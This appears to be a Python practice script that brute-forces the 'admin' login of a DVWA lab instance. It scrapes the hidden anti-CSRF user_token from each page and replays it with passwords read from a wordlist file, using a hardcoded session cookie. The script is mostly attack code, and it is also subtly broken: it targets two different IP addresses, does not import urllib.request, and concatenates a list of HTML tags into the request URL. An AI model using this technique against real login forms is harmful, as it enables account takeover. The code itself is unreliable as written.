# coding=utf-8
from bs4 import BeautifulSoup
import urllib
from lxml import etree

header={'Host': '192.168.234.129',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://192.168.234.129/dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=dkrtr3b17gem0817sc6b4ta4lh'}
requrl = "http://192.168.234.129/dvwa/vulnerabilities/brute/"

def get_token(requrl,header):
    req = urllib.request.Request(requrl, headers = header)
    response = urllib.request.urlopen(req)
    print(response.getcode())
    the_page = response.read()
    print(len(the_page))
    soup = BeautifulSoup(the_page,"html.parser")
    #print('\r\n\r\nresponse start:\r\n\r\n' + the_page.decode('utf-8') + '\r\n\r\nsoup start:\r\n\r\n' )
    user_token = soup.select('#content > form > input[type="hidden"]') #get the user_token
    print(user_token)
    return user_token

user_token = get_token(requrl,header)
i=0
for line in open("rkolin.txt"):
	requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print(i,'admin',line.strip())
	user_token = get_token(requrl,header)
	if (i == 10):
		break
